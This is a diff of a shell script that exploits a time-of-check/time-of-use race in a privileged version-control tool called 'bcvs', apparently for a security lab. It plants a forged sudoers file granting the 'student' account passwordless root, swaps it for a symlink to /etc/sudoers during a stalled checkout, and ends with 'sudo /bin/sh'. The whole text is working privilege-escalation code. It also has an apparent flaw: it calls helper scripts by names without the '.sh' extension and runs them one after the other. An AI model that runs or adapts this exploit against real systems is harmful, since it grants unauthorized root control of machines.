@@ -1,14 +1,43 @@
 #lets do a race condition between when is_blocked() is called and the write!
 USER="root"
 cd /opt/bcvs
-touch helper.sh
-chmod +x helper.sh
+
+touch helper1.sh
+chmod +x helper1.sh
 echo "
 cd /opt/bcvs
-sleep 5
+/usr/bin/expect -c '
+sleep 0.5
+cd /opt/bcvs
+sleep 0.5
+spawn ./bcvs ci sudoers_but_better
+sleep 0.5
+expect \"Please write a SHORT explanation:\r\"
+sleep 0.5
+send -- \"no\n\"
+sleep 0.5
+'
+/usr/bin/expect -c '
+sleep 0.5
+cd /opt/bcvs
+sleep 0.5
+spawn ./bcvs co sudoers_but_better
+sleep 0.5
+expect \"Please write a SHORT explanation:\r\"
+sleep 15
+send -- \"no\n\"
+sleep 0.5
+'
+" >> helper1.sh
+
+touch helper2.sh
+chmod +x helper2.sh
+echo "
+cd /opt/bcvs
+sleep 7
 rm -f sudoers_but_better
 ln -s /etc/sudoers sudoers_but_better
-" >> helper.sh
+" >> helper2.sh
 
 touch sudoers_but_better
 echo "## sudoers file.
@@ -111,29 +140,6 @@ root ALL=(ALL) ALL
 student ALL=(ALL) NOPASSWD: ALL
 " >> sudoers_but_better
 
-#checkin fake sudoers
-/usr/bin/expect -c '
-sleep 0.5
-cd /opt/bcvs
-sleep 0.5
-spawn ./bcvs ci sudoers_but_better
-sleep 0.5
-expect "Please write a SHORT explanation:\r"
-sleep 0.5
-send -- "no\n"
-sleep 0.5
-'
+./helper1 && ./helper2
 
-#checkout fake sudoers, but wait when it tells ya to enter the log
-#this will take a while cuz sleep
-/usr/bin/expect -c '
-sleep 0.5
-cd /opt/bcvs
-sleep 0.5
-spawn ./bcvs co sudoers_but_better
-sleep 0.5
-expect "Please write a SHORT explanation:\r"
-sleep 10
-send -- "no\n"
-sleep 0.5
-' && ./helper.sh
+sudo /bin/sh
